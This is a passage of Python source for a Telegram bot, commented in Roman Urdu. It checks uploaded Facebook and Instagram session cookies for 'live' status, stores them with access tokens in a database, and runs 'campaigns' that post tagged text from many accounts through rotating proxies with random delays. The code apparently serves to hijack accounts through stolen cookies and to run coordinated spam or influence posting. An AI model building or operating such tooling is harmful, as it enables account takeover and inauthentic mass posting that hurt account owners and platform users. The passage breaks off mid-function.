        except Exception as e:  # noqa: BLE001
            logger.exception("db reverify %s", uname)
            counts["errors"] += 1
            last_note = f"ERROR {type(e).__name__} | {uname}"
        done += 1
        await reporter.update(done, counts, last=last_note)

    await reporter.update(done, counts, last=last_note, force=True)
    await msg.edit_text(
        f"DB reverify done | {table}\n"
        f"working: {counts['working']} | dead: {counts['dead']} | "
        f"unknown: {counts['unknown']} | errors: {counts['errors']}"
    )


async def db_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await _require_admin(update):
        return
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return

    args = context.args or []
    sub = args[0].lower() if args else "stats"

    if not _db:
        await update.message.reply_text("SUPABASE_URL / KEY set nahi.")
        return

    if sub == "stats":
        async with httpx.AsyncClient(timeout=httpx.Timeout(10.0)) as cl:
            lines = ["DB stats:"]
            for table in ("fb_accounts", "ig_accounts"):
                total = await _db.count(cl, table)
                live = await _db.count(cl, table, "live")
                dead = await _db.count(cl, table, "dead")
                unknown = await _db.count(cl, table, "unknown")
                lines.append(
                    f"{table}: {total} total | live {live} | dead {dead} | unknown {unknown}"
                )
        await update.message.reply_text("\n".join(lines))
        await audit_log(uid, "db_stats", {})
        return

    if sub == "export":
        platform = args[1].lower() if len(args) > 1 else "fb"
        if platform not in ("fb", "facebook", "ig", "instagram"):
            await update.message.reply_text("Usage: /db export fb|ig")
            return
        try:
            await _db_export(update, context, platform)
        except Exception as e:  # noqa: BLE001
            logger.exception("db export")
            await update.message.reply_text(f"Export failed: {type(e).__name__}: {e}")
        await audit_log(uid, "db_export", {"platform": platform})
        return

    if sub == "reverify":
        platform = args[1].lower() if len(args) > 1 else "fb"
        limit = _to_int(args[2], 100) if len(args) > 2 else 100
        if platform not in ("fb", "facebook", "ig", "instagram"):
            await update.message.reply_text("Usage: /db reverify fb|ig [limit]")
            return
        try:
            await _db_reverify(update, context, platform, limit)
        except Exception as e:  # noqa: BLE001
            logger.exception("db reverify")
            await update.message.reply_text(f"Reverify failed: {type(e).__name__}: {e}")
        await audit_log(uid, "db_reverify", {"platform": platform, "limit": limit})
        return

    await update.message.reply_text("/db stats | /db export fb|ig | /db reverify fb|ig [limit]")


# ============================ CAMPAIGN ============================

async def camp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await _require_admin(update):
        return
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return

    args = context.args
    sub = args[0].lower() if args else ""

    if sub in ("", "status"):
        cfg = CAMPS.get(uid)
        if not cfg:
            await update.message.reply_text(
                "Set nahi.\n/camp new <name> | /camp platform facebook|instagram | "
                "/camp text | /camp media | /camp filter | /camp preview | /camp start"
            )
            return
        await update.message.reply_text(
            f"CAMP {cfg['name'] or '-'} | {cfg['stage']}\n"
            f"Platform: {cfg['platform']}\n"
            f"Tag: {cfg['tag']}\n"
            f"Branding: {'on' if cfg.get('branding', True) else 'off'}\n"
            f"Source: {cfg['source']}\n"
            f"Filter: {cfg['filter']}\n"
            f"Limit: {cfg['limit']}\n"
            f"Delay: {cfg['delay'][0]}-{cfg['delay'][1]}s\n"
            f"Dry run: {cfg['dry_run']}\n"
            f"Texts: {len(cfg['texts'])}\n"
            f"Media: {len(cfg.get('media', []))}\n"
            f"Media URL: {cfg.get('media_url') or '-'}"
        )
        return

    if sub == "new":
        if uid in CAMPRUN:
            await update.message.reply_text(
                "Campaign chal raha hai. Pehle /stopcamp ya /cancel karo."
            )
            return
        cfg = new_camp()
        cfg["name"] = safe_text((" ".join(args[1:]) or "camp"), 40)
        CAMPS[uid] = cfg
        save_camp(uid)
        await update.message.reply_text(
            f"Bana: {cfg['name']}\n"
            f"Ab /camp platform facebook|instagram karo."
        )
        await audit_log(uid, "campaign_new", {"name": cfg["name"]})
        return

    cfg = CAMPS.get(uid)
    if not cfg:
        await update.message.reply_text("Pehle /camp new <name>.")
        return

    # Koi bhi activity campaign ko TTL cleanup se bachaye.
    cfg["stage_at"] = time.time()

    if sub == "platform":
        p = (args[1] if len(args) > 1 else "").lower()
        if p not in ("facebook", "instagram", "fb", "ig"):
            await update.message.reply_text("facebook|instagram")
            return
        cfg["platform"] = "facebook" if p in ("facebook", "fb") else "instagram"
        save_camp(uid)
        await update.message.reply_text(f"Platform = {cfg['platform']}")
        await audit_log(uid, "campaign_platform", {"platform": cfg["platform"]})
        return

    if sub == "text":
        cfg["stage"] = "text"
        cfg["stage_at"] = time.time()
        save_camp(uid)
        user_state[uid] = {
            "mode": "campaign",
            "stage": "text",
            "platform": cfg.get("platform"),
            "at": time.time(),
        }
        await update.message.reply_text(
            "Text mode. Variants bhejo (ek message = ek variant).\n/camp idle se band."
        )
        return

    if sub == "idle":
        cfg["stage"] = "idle"
        save_camp(uid)
        st = user_state.get(uid, {})
        if st.get("mode") == "campaign":
            user_state.pop(uid, None)
        await update.message.reply_text("Band.")
        return

    if sub == "media":
        cfg["stage"] = "media"
        cfg["stage_at"] = time.time()
        save_camp(uid)
        user_state[uid] = {
            "mode": "campaign",
            "stage": "media",
            "platform": cfg.get("platform"),
            "at": time.time(),
        }
        await update.message.reply_text(
            "Photo/video bhejo.\n"
            "Note: Graph API ko public image URL chahiye; file_id se direct post "
            "nahi hota. URL ke liye /camp mediaurl <https://...> use karo."
        )
        return

    if sub in ("mediaurl", "mediaclear"):
        if sub == "mediaclear" or (args[1].lower() if len(args) > 1 else "") == "clear":
            cfg["media_url"] = ""
            save_camp(uid)
            await update.message.reply_text("Media URL clear.")
            return
        url = args[1] if len(args) > 1 else ""
        if not url.lower().startswith(("http://", "https://")):
            await update.message.reply_text("Usage: /camp mediaurl https://public/image.jpg")
            return
        cfg["media_url"] = url
        save_camp(uid)
        await update.message.reply_text("Media URL set. IG post isi image se hoga.")
        return

    if sub == "source":
        src = (args[1] if len(args) > 1 else "").lower()
        if src not in ("zip", "db"):
            await update.message.reply_text("/camp source zip|db")
            return
        cfg["source"] = src
        save_camp(uid)
        await update.message.reply_text(f"Source = {src}")
        return

    if sub == "filter":
        f = cfg["filter"]
        k = args[1] if len(args) > 1 else ""
        if k == "clear":
            cfg["filter"] = {"countries": [], "years": [], "min_followers": 0}
            save_camp(uid)
            await update.message.reply_text("Filter clear.")
            return
        if len(args) < 3:
            await update.message.reply_text("country | year | followers | clear")
            return
        if k == "country":
            # "PK, US" -> ["PK", "US"] (leading space strip warna US match nahi hota)
            f["countries"] = [x.upper() for x in _split_csv(args[2:])]
        elif k == "year":
            f["years"] = _split_csv(args[2:])
        elif k == "followers":
            try:
                f["min_followers"] = max(int(args[2]), 0)
            except Exception:
                await update.message.reply_text("/camp filter followers 500")
                return
        save_camp(uid)
        await update.message.reply_text(f"Filter: {cfg['filter']}")
        return

    if sub == "limit":
        try:
            cfg["limit"] = max(int(args[1]), 0)
        except Exception:
            await update.message.reply_text("Number do.")
            return
        save_camp(uid)
        await update.message.reply_text(f"Limit = {cfg['limit']}")
        return

    if sub == "branding":
        val = (args[1] if len(args) > 1 else "").lower()
        if val in ("on", "1", "yes"):
            cfg["branding"] = True
        elif val in ("off", "0", "no"):
            cfg["branding"] = False
        else:
            await update.message.reply_text(
                f"Branding = {'on' if cfg.get('branding', True) else 'off'}"
                " | /camp branding on|off"
            )
            return
        save_camp(uid)
        await update.message.reply_text(f"Branding = {'on' if cfg['branding'] else 'off'}")
        return

    if sub == "tag":
        t = args[1] if len(args) > 1 else ""
        if not t:
            await update.message.reply_text("Tag do: /camp tag #EvilMarkhors")
            return
        cfg["tag"] = t if t.startswith("#") else "#" + t.lstrip("#")
        save_camp(uid)
        await update.message.reply_text(f"Tag = {cfg['tag']}")
        return

    if sub == "delay":
        try:
            lo, hi = args[1].split("-")
            cfg["delay"] = [float(lo), float(hi)]
        except Exception:
            await update.message.reply_text("/camp delay 45-110")
            return
        save_camp(uid)
        await update.message.reply_text(f"Delay = {cfg['delay']}")
        return

    if sub == "dry":
        cfg["dry_run"] = not cfg["dry_run"]
        save_camp(uid)
        await update.message.reply_text(f"dry = {cfg['dry_run']}")
        return

    if sub == "preview":
        if not cfg["texts"]:
            await update.message.reply_text("Pehle text variants bhejo.")
            return
        for i, t in enumerate(cfg["texts"][:5]):
            preview = compose_post_text(
                t,
                cfg.get("tag") or DEFAULT_TAG,
                bool(cfg.get("branding", POST_BRANDING)),
            )
            await update.message.reply_text(f"Variant {i+1}:\n{safe_text(preview, 4096)}")
        return

    if sub == "start":
        if uid in CAMPRUN:
            await update.message.reply_text("Pehle wala campaign chal raha hai. /stopcamp ya /cancel.")
            return
        if not cfg["texts"]:
            await update.message.reply_text("Pehle /camp text se variants bhejo.")
            return
        if cfg["platform"] not in ("facebook", "instagram"):
            await update.message.reply_text("Pehle /camp platform facebook|instagram set karo.")
            return
        if cfg["platform"] == "instagram" and not cfg.get("media_url"):
            await update.message.reply_text(
                "Note: Instagram text-only post nahi hota. Public image URL ke "
                "bina sab posts UNSUPPORTED aayenge. /camp mediaurl https://... "
                "set karo (ya /camp dry se test karo)."
            )

        if cfg.get("source") == "db":
            if not _db:
                await update.message.reply_text("DB off. /camp source zip karo.")
                return
            await _start_campaign_from_db(update, context, uid, cfg)
            return

        cfg["stage"] = "cookies"
        cfg["stage_at"] = time.time()
        save_camp(uid)
        user_state[uid] = {
            "mode": "campaign",
            "platform": cfg["platform"],
            "at": time.time(),
        }
        await update.message.reply_text(
            "Ab cookie zip bhejo (campaign ke liye)."
        )
        await audit_log(uid, "campaign_start", {"name": cfg["name"], "platform": cfg["platform"]})
        return

    if sub == "reset":
        name = cfg.get("name", "")
        CAMPS.pop(uid, None)
        user_state.pop(uid, None)
        if uid in CAMPRUN:
            CAMPRUN[uid]["stop"] = True
        # State file delete karo, warna restart par load_camps() ise wapas le aata hai.
        try:
            path = os.path.join(STATE_DIR, f"camp_{uid}.json")
            if os.path.isfile(path):
                os.remove(path)
        except OSError:
            logger.exception("camp reset: state file delete failed")
        await update.message.reply_text("Reset. Campaign state file bhi delete ho gayi.")
        await audit_log(uid, "campaign_reset", {"name": name})
        return

    await update.message.reply_text("Subcommand samajh nahi aayi. /camp dekho.")


async def stopcamp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("Sirf admin.")
        return
    if not check_user_rate_limit(uid):
        await update.message.reply_text("Rate limit hit. Please wait before sending another command.")
        return
    if uid in CAMPRUN:
        CAMPRUN[uid]["stop"] = True
        await update.message.reply_text("Stop - current account ke baad rukega.")
        await audit_log(uid, "campaign_stop", {})
    else:
        await update.message.reply_text("Koi campaign nahi.")


# ============================ CAMPAIGN LOOP ============================

async def _start_campaign_from_db(update: Update, context: ContextTypes.DEFAULT_TYPE, uid: int, cfg: dict):
    """Fetch live accounts from Supabase and run the campaign without a zip."""
    table = _table_for(cfg["platform"])
    limit = cfg.get("limit") or 500
    async with httpx.AsyncClient(timeout=httpx.Timeout(20.0)) as cl:
        rows = await _db.fetch(cl, table, {"status": "eq.live"}, limit=min(limit, 5000))

    accounts = []
    for row in rows:
        acc = _account_from_row(row)
        if acc["cookies"]:
            accounts.append(acc)
    if cfg.get("limit"):
        accounts = accounts[: cfg["limit"]]

    if not accounts:
        await update.message.reply_text(f"DB ({table}) me live accounts nahi mile.")
        return

    msg = await update.message.reply_text(f"DB campaign shuru: {len(accounts)} live accounts")
    CAMPRUN[uid] = {"stop": False}
    try:
        await _campaign_loop(uid, cfg, accounts, CAMPRUN[uid], update=update, progress_msg=msg)
    finally:
        CAMPRUN.pop(uid, None)


async def _campaign_loop(
    uid: int,
    cfg: dict,
    accounts: list,
    state: dict,
    update: Optional[Update] = None,
    progress_msg=None,
):
    """Campaign loop: verify each account, post text, save to DB (live progress ke saath)."""
    platform = cfg["platform"]
    platform_obj = get_platform(platform)
    if not platform_obj:
        logger.error(f"Platform {platform} not initialized")
        return

    texts = cfg["texts"]
    if not texts:
        return

    filt = cfg["filter"]
    prog_total = len(accounts)
    posted_count = 0
    failed_count = 0
    skipped_count = 0
    dry_count = 0
    unsupported_count = 0
    done_count = 0
    last_note = ""

    if progress_msg is None and update is not None:
        progress_msg = await update.message.reply_text("Campaign shuru ho raha hai...")
    reporter = (
        ProgressReporter(
            progress_msg,
            f"\U0001F4E3 CAMPAIGN: {cfg.get('name') or platform} ({platform})",
            prog_total,
        )
        if progress_msg is not None
        else None
    )
    if reporter:
        await reporter.update(
            0,
            {"working": 0, "dead": 0, "unknown": 0, "errors": 0},
            last="accounts verify ho rahe hain...",
            force=True,
        )

    sem = asyncio.Semaphore(max(CONCURRENCY, 1))
    # Ek hi DB client poore campaign ke liye (per-account client slow tha).
    db_client = httpx.AsyncClient(timeout=httpx.Timeout(10.0)) if _db else None
    media_url = str(cfg.get("media_url") or "")

    async def _do_account(acc):
        nonlocal posted_count, failed_count, skipped_count, dry_count, unsupported_count, last_note
        username = str(acc.get("username", "") or "")

        ck = acc.get("cookies", {})
        if not ck:
            failed_count += 1
            last_note = f"NO COOKIES | {username}"
            return
        ck = decrypt_cookies(ck)

        proxy = _pick_proxy()
        check = await _verify_cookie(platform_obj, ck, proxy=proxy)
        status = check.get("Status", "UNKNOWN")

        uname = str(check.get("username") or "").strip()
        if not uname or uname.lower() in _GENERIC_USERNAMES:
            uname = username
        uname = safe_text(uname)

        if status != "LIVE":
            failed_count += 1
            last_note = f"{status} ({check.get('via', '-')}) {check.get('Reason', '')[:40]} | {uname}"
            if _db and uname and db_client is not None:
                try:
                    await _db.patch_status(
                        db_client,
                        "fb_accounts" if platform == "facebook" else "ig_accounts",
                        uname,
                        status.lower(),
                        ok=False,
                    )
                except Exception:  # noqa: BLE001
                    logger.debug("status patch failed", exc_info=True)
            return

        # Filters use the metadata saved with the account (live checks do not
        # reliably return followers/country).
        country = str(acc.get("country") or check.get("country") or "")
        followers = _to_int(acc.get("followers")) or _to_int(
            check.get("followers") or check.get("Followers")
        )
        year = str(acc.get("year") or "")
        if filt.get("countries") and country and country.upper() not in [
            c.upper() for c in filt["countries"]
        ]:
            skipped_count += 1
            last_note = f"FILTER country={country} | {uname}"
            return
        if filt.get("years") and year and year not in [
            str(y) for y in filt["years"]
        ]:
            skipped_count += 1
            last_note = f"FILTER year={year} | {uname}"
            return
        if filt.get("min_followers", 0) > followers:
            skipped_count += 1
            last_note = f"FILTER followers={followers} | {uname}"
            return

        if cfg.get("dry_run"):
            dry_count += 1
            last_note = f"DRY RUN (no post) | {uname}"
            return

        text = compose_post_text(
            random.choice(texts),
            cfg.get("tag") or DEFAULT_TAG,
            bool(cfg.get("branding", POST_BRANDING)),
        )
        # Per-account media URL optional; campaign-level fallback.
        media = str(acc.get("media_url") or media_url or "")
        post_proxy = proxy if check.get("via") == "proxy" else None
        access_token = str(acc.get("access_token") or "")
        target_id = str(acc.get("target_id") or "")
        cl = platform_obj.http_client(proxy=post_proxy)
        try:
            ok, post_id, err = await platform_obj.post(
                cl,
                ck,
                text,
                media=media or None,
                access_token=access_token or None,
                target_id=target_id or None,
            )
        finally:
            await cl.aclose()

        if ok:
            posted_count += 1
            last_note = f"POSTED {post_id or ''} via {check.get('via', '-')} | {uname}"
            if _db and uname:
                now = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                row = {
                    "username": uname,
                    "fb_id": str(check.get("fb_id") or (target_id if platform == "facebook" else "")) or "",
                    "ig_id": str(check.get("ig_id") or (target_id if platform == "instagram" else "")) or "",
                    "cookies": encrypt_cookies(ck),
                    "country": country,
                    "followers": followers,
                    "verified": bool(acc.get("verified")) or str(check.get("Verified", "")).lower() == "true",
                    "status": "live",
                    "source": "campaign",
                    "last_check": now,
                    "last_ok": now,
                    "last_post": now,
                }
                try:
                    if db_client is not None:
                        saved, db_err = await _db.upsert(
                            db_client,
                            "fb_accounts" if platform == "facebook" else "ig_accounts",
                            [row],
                        )
                        if not saved:
                            logger.warning(
                                "campaign DB save failed for %s: %s", uname, db_err
                            )
                except Exception:  # noqa: BLE001
                    logger.exception("campaign DB save failed for %s", uname)
        elif err and str(err).startswith("UNSUPPORTED"):
            # Cookie-only post nahi hota (token / public media URL missing).
            # Isay alag count karo taake summary sach bole.
            unsupported_count += 1
            last_note = f"UNSUPPORTED post | {uname}"
        else:
            failed_count += 1
            last_note = f"POST FAILED: {err or 'unknown'} | {uname}"

    async def process_account(acc):
        nonlocal done_count, last_note, failed_count
        if state.get("stop") or CAMPRUN.get(uid, {}).get("stop"):
            return
        username = str(acc.get("username", "") or "?")
        try:
            if state.get("stop") or CAMPRUN.get(uid, {}).get("stop"):
                return
            await asyncio.wait_for(_do_account(acc), timeout=max(ACC_TIMEOUT, 10.0))
        except asyncio.TimeoutError:
            failed_count += 1
            last_note = f"TIMEOUT ({ACC_TIMEOUT:.0f}s) | {username}"
        except Exception as e:  # noqa: BLE001
            logger.exception("campaign account failed: %s", username)
            failed_count += 1
            last_note = f"ERROR {type(e).__name__} | {username}"
        finally:
            done_count += 1
            if reporter:
                await reporter.update(
                    done_count,
                    {
                        "working": posted_count,
                        "dead": failed_count,
                        "unknown": skipped_count + dry_count + unsupported_count,
                        "errors": 0,
                    },
                    last=last_note,
                )

        # Delay between accounts (skipped after /stopcamp; dry run me bhi nahi).
        if not (
            state.get("stop")
            or CAMPRUN.get(uid, {}).get("stop")
            or cfg.get("dry_run")
        ):
            lo, hi = cfg["delay"]
            await asyncio.sleep(random.uniform(min(lo, hi), max(lo, hi)))

    async def run_account(acc):
        async with sem:
            await process_account(acc)

    try:
        await asyncio.gather(
            *(run_account(acc) for acc in accounts), return_exceptions=True
        )
    finally:
        if db_client is not None:
            await db_client.aclose()

    summary = (
        f"Campaign complete! ({prog_total} accounts)\n"
        f"Posted: {posted_count}\n"
        f"Failed: {failed_count}\n"
        f"Unsupported (token/media missing): {unsupported_count}\n"
        f"Skipped (filter): {skipped_count}\n"
        f"Dry run: {dry_count}\n"
        f"Unprocessed/stopped: {prog_total - done_count}"
    )
    if update is not None:
        await update.message.reply_text(summary)
    elif progress_msg is not None:
        try:
            await progress_msg.edit_text(summary)
        except Exception:  # noqa: BLE001
            pass
    # Clear campaign mode only if the user has not switched to another mode
    # while this campaign was running.
    if user_state.get(uid, {}).get("mode") == "campaign":
        user_state.pop(uid, None)
    cfg["stage"] = "idle"
    cfg["stage_at"] = time.time()
    save_camp(uid)


# ============================ FILE HANDLING ============================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle cookie file uploads for rework/verify/campaign."""
    uid = update.effective_user.id
    if not await _require_admin(update):
        return
    if not check_content_rate_limit(uid):
        await update.message.reply_text("Thoda ruk kar dobara file bhejo (flood protection).")
        return

    doc = update.message.document
    if not doc:
        return

    if not doc.file_name or not doc.file_name.lower().endswith((".txt", ".zip")):
        await update.message.reply_text("Sirf .txt ya .zip file bhejo.")
        return

    state = user_state.get(uid)
    if not state:
        await update.message.reply_text(
            "Pehle mode select karo: /rework, /verify, ya /camp start."
        )
        return

    mode = state.get("mode", "rework")
    if mode == "campaign":
        cfg = CAMPS.get(uid)
        if not cfg or not cfg.get("texts") or not cfg.get("platform"):
            await update.message.reply_text(
                "Campaign adhoora hai: /camp platform + /camp text complete karo, phir /camp start."
            )
            return

    msg = await update.message.reply_text("File download ho rahi hai...")
    cleanup_user_state()

    has_proxy = bool(get_active_proxies())
    no_proxy_note = "" if has_proxy else " | ⚠️ proxy OFF (direct traffic)"

    tmp = tempfile.mkdtemp(prefix="sm_")
    # Poore upload ke liye ek DB client (per-file client 15k files par slow).
    db_client = httpx.AsyncClient(timeout=httpx.Timeout(10.0)) if _db else None
    try:
        file = await context.bot.get_file(doc.file_id)
        path = os.path.join(tmp, os.path.basename(doc.file_name))
        await file.download_to_drive(path)

        is_zip = doc.file_name.lower().endswith(".zip")
        if is_zip:
            if not _zipfile.is_zipfile(path):
                await msg.edit_text("Invalid zip file.")
                return
        else:
            try:
                with open(path, encoding="utf-8", errors="ignore") as fh:
                    fh.read(1)
            except OSError:
                await msg.edit_text("File read nahi ho saki.")
                return

        results = []
        progress_counts = {"working": 0, "dead": 0, "unknown": 0, "errors": 0}

        def error_result(name: str, raw: str, exc: Exception):
            detail = (
                "REWORK ERROR\n"
                f"File: {name}\n"
                f"{type(exc).__name__}: {exc}\n\n"
                "--- first 500 chars ---\n"
                + (raw[:500] if raw else "(file empty)")
            )
            return (name, detail, f"ERROR: {type(exc).__name__}", {}, {})

        async def process_entry(name: str, raw: str):
            try:
                return await asyncio.wait_for(
                    _process_one(name, raw, state, db_client=db_client),
                    timeout=FILE_TIMEOUT,
                )
            except asyncio.TimeoutError:
                return error_result(
                    name, raw, TimeoutError(f"processing timeout ({FILE_TIMEOUT:.0f}s)")
                )
            except Exception as e:  # noqa: BLE001
                logger.exception("process failed: %s", name)
                return error_result(name, raw, e)

        def record(result, processed: int):
            results.append(result)
            folder = _status_folder(result[2])
            progress_counts[folder] += 1
            meta = result[4] if len(result) > 4 else {}
            who = str(meta.get("Username", "") or safe_zip_entry_name(result[0]))
            extra = f" | ID {meta.get('ID')}" if meta.get("ID") else ""
            via = f" | via {meta.get('Via')}" if meta.get("Via") else ""
            return who, f"{result[2]}{via}{extra} | {safe_zip_entry_name(result[0])}"

        if is_zip:
            with _zipfile.ZipFile(path) as z:
                infos = [
                    i for i in z.infolist()
                    if not i.is_dir() and i.filename.lower().endswith(".txt")
                ]
                if not infos:
                    await msg.edit_text(
                        "Zip me koi .txt file nahi mili. Sirf .txt entries bhejo."
                    )
                    return
                total_uncompressed = sum(i.file_size for i in infos)
                if total_uncompressed > ZIP_MAX_TOTAL:
                    await msg.edit_text(
                        f"Zip bomb detected: total uncompressed size "
                        f"{total_uncompressed // (1024 * 1024)}MB exceeds limit "
                        f"{ZIP_MAX_TOTAL // (1024 * 1024)}MB"
                    )
                    return

                total_found = len(infos)
                truncated = total_found > MAX_FILES
                infos = infos[:MAX_FILES]

                live_on = bool(state.get("live") or mode == "verify")
                reporter = ProgressReporter(
                    msg,
                    f"\U0001F4E6 {mode.upper()} processing"
                    + (" + live verify" if live_on else ""),
                    len(infos),
                )
                await reporter.update(
                    0,
                    progress_counts,
                    last=f"shuru ho raha hai... ({total_found} files)"
                    + (f" — sirf pehli {MAX_FILES}" if truncated else ""),
                    force=True,
                )

                processed = 0
                actual_total = 0
                batch_size = max(CONCURRENCY * 4, 32) if live_on else 1
                for start in range(0, len(infos), batch_size):
                    batch = infos[start:start + batch_size]
                    raws = []
                    for info in batch:
                        name = info.filename
                        if info.file_size > ZIP_MAX_FILE:
                            processed += 1
                            who, note = record(
                                (
                                    name,
                                    "REWORK ERROR\n"
                                    f"File: {name}\n"
                                    f"Entry too large: {info.file_size} bytes "
                                    f"(limit {ZIP_MAX_FILE})\n",
                                    "ERROR: ZipEntryTooLarge",
                                    {},
                                    {},
                                ),
                                processed,
                            )
                            await reporter.update(processed, progress_counts, current=who, last=note)
                            continue
                        try:
                            # Declared size spoof ho sakta hai (zip bomb), is liye
                            # actual bytes ko cap ke saath padho.
                            with z.open(info) as fh:
                                blob = fh.read(ZIP_MAX_FILE + 1)
                            if len(blob) > ZIP_MAX_FILE:
                                raise ValueError(
                                    f"entry actual size > {ZIP_MAX_FILE} bytes"
                                )
                            actual_total += len(blob)
                            if actual_total > ZIP_MAX_TOTAL:
                                await msg.edit_text(
                                    f"Zip bomb detected: actual uncompressed data "
                                    f"exceeds {ZIP_MAX_TOTAL // (1024 * 1024)}MB. "
                                    "Upload chhota karo."
                                )
                                return
                            raw = blob.decode("utf-8", "ignore")
                        except Exception as e:  # noqa: BLE001
                            processed += 1
                            who, note = record(error_result(name, "", e), processed)
                            await reporter.update(processed, progress_counts, current=who, last=note)
                            continue
                        raws.append((name, raw))

                    if not raws:
                        continue

                    if live_on:
                        await reporter.update(
                            processed,
                            progress_counts,
                            current=f"{len(raws)} files in parallel...",
                            last="checking...",
                        )
                        tasks = [asyncio.create_task(process_entry(n, r)) for n, r in raws]
                        for finished in asyncio.as_completed(tasks):
                            result = await finished
                            processed += 1
                            who, note = record(result, processed)
                            await reporter.update(processed, progress_counts, current=who, last=note)
                    else:
                        for name, raw in raws:
                            result = await process_entry(name, raw)
                            processed += 1
                            who, note = record(result, processed)
                            await reporter.update(processed, progress_counts, current=who, last=note)

                if processed:
                    await reporter.update(
                        processed,
                        progress_counts,
                        current="",
                        last=f"zip complete | {processed} files",
                        force=True,
                    )
        else:
            with open(path, encoding="utf-8", errors="ignore") as fh:
                raw = fh.read()
            result = await process_entry(doc.file_name, raw)
            record(result, 1)

        # If campaign mode, run campaign loop
        if mode == "campaign":
            cfg = CAMPS.get(uid)
            accounts = []
            skipped_platform = 0
            for name, _out, _status, cookies, meta in results:
                if not cookies:
                    continue
                # Mixed/wrong-platform files must not enter this campaign.
                file_platform = str(meta.get("Platform", "") or "").lower()
                if file_platform not in ("", cfg["platform"]):
                    skipped_platform += 1
                    logger.warning(
                        "campaign skip %s: file platform=%s campaign=%s",
                        name, file_platform, cfg["platform"],
                    )
                    continue
                uname = str(
                    meta.get("Username")
                    or meta.get("ID")
                    or safe_zip_entry_name(name)
                )
                accounts.append({
                    "username": uname,
                    "cookies": cookies,
                    "country": meta.get("Country", ""),
                    "year": meta.get("Year", ""),
                    "followers": _to_int(meta.get("Followers")),
                    "verified": str(meta.get("Verified", "")).lower() == "true",
                    "access_token": str(
                        meta.get("Access token") or meta.get("Token") or ""
                    ),
                    "target_id": str(meta.get("ID", "")),
                })
            if cfg and cfg.get("limit"):
                accounts = accounts[: cfg["limit"]]

            if not accounts:
                await msg.edit_text(
                    "Campaign: koi valid cookies nahi mili."
                    + (
                        f"\n{skipped_platform} files ka platform match nahi hua "
                        f"({cfg['platform']} campaign)."
                        if skipped_platform else ""
                    )
                )
                return

            note = (
                f" | {skipped_platform} skipped (platform mismatch)"
                if skipped_platform else ""
            )
            await msg.edit_text(f"Campaign shuru: {len(accounts)} accounts{note}")
            CAMPRUN[uid] = {"stop": False}
            try:
                await _campaign_loop(uid, cfg, accounts, CAMPRUN[uid], update=update, progress_msg=msg)
            finally:
                CAMPRUN.pop(uid, None)
            return

        # Create output zip for rework/verify mode
        out_path = os.path.join(tmp, "out.zip")
        used = set()
        with _zipfile.ZipFile(out_path, "w", _zipfile.ZIP_DEFLATED) as zout:
            for name, output, status, *_ in results:
                folder = _status_folder(status)
                safe_name = safe_zip_entry_name(name) or "cookie.txt"
                if safe_name in used:
                    stem, ext = os.path.splitext(safe_name)
                    idx = 2
                    while f"{stem}__{idx}{ext}" in used:
                        idx += 1
                    safe_name = f"{stem}__{idx}{ext}"
                used.add(safe_name)
                zout.writestr(f"{folder}/{safe_name}", output)

        live_state = state.get("live") or mode == "verify"
        summary = (
            f"{mode.upper()} complete | {len(results)} files\n"
            f"working: {progress_counts['working']} | dead: {progress_counts['dead']} | "
            f"unknown: {progress_counts['unknown']} | errors: {progress_counts['errors']}\n"
            f"Live check: {'ON' if live_state else 'OFF (/live on)'} | "
            f"DB: {'ON' if _db else 'OFF'}{no_proxy_note}"
        )
        with open(out_path, "rb") as fh:
            await context.bot.send_document(
                update.effective_chat.id,
                document=fh,
                filename=f"reworked_{int(time.time())}.zip",
                caption=summary,
            )
        await msg.edit_text(summary)

    except Exception as e:  # noqa: BLE001
        logger.exception("handle_file")
        await msg.edit_text(f"File process karne mein error aaya: {type(e).__name__}: {e}")
    finally:
        if db_client is not None:
            await db_client.aclose()
        shutil.rmtree(tmp, ignore_errors=True)


async def _verify_cookie(platform_obj: BasePlatform, cookies: Dict[str, str], proxy: Optional[str] = None) -> Dict[str, Any]:
    """Proxy + direct (Railway IP) dono routes se verify karo.

    Har route ke andar platform-level retries (exponential backoff) chalti hain.
    - LIVE mile to turant return.
    - DEAD mile to turant return (cookie hi dead hai, route change ka faida nahi).
    - Dono route fail ho to detailed reason return.
    """
    hint = _cookie_platform_hint(cookies)
    if hint == "mixed":
        return {
            "Status": "UNKNOWN",
            "Platform": platform_obj.NAME,
            "Reason": "mixed FB + IG cookies — verify nahi kiya",
        }
    if hint and hint != platform_obj.NAME:
        return {
            "Status": "UNKNOWN",
            "Platform": platform_obj.NAME,
            "Reason": f"platform mismatch: file {hint} cookies, checker {platform_obj.NAME}",
        }

    routes = []
    if proxy:
        try:
            routes.append(("proxy", platform_obj.http_client(proxy=proxy)))
        except Exception as e:  # noqa: BLE001
            logger.warning(
                "proxy client create failed (%s): %s",
                mask_proxy(proxy),
                mask_sensitive(str(e)),
            )
    try:
        routes.append(("direct", platform_obj.http_client()))
    except Exception as e:  # noqa: BLE001
        logger.warning("direct client create failed: %s", e)

    if not routes:
        return {
            "Status": "UNKNOWN",
            "Platform": platform_obj.NAME,
            "Reason": "no http client could be created",
        }

    results = []
    final = None
    dead_result = None
    last_error = None

    for label, cl in routes:
        try:
            check = await platform_obj.live_check(cl, cookies)
        except Exception as e:
            logger.warning(
                "verify %s route error: %s", label, mask_sensitive(str(e))
            )
            last_error = e
            check = {
                "Status": "UNKNOWN",
                "Reason": f"{type(e).__name__}: {mask_sensitive(str(e))[:60]}",
            }
        finally:
            await cl.aclose()

        check["via"] = label
        results.append(check)
        status = check.get("Status")

        if status == "LIVE":
            return check
        if status == "DEAD":
            # Proxy ka DEAD false positive ho sakta hai (IP/region block).
            # Direct route available ho to confirm karo.
            if label == "direct" or not VERIFY_CONFIRM_DEAD:
                return check
            dead_result = check
            continue

        final = check

    if dead_result is not None:
        combined = " | ".join(
            f"{r.get('via')}: {r.get('Status')}/{r.get('Reason', '')}"
            for r in results
        )
        # Proxy ne DEAD kaha lekin direct route confirm nahi kar saka (UNKNOWN)
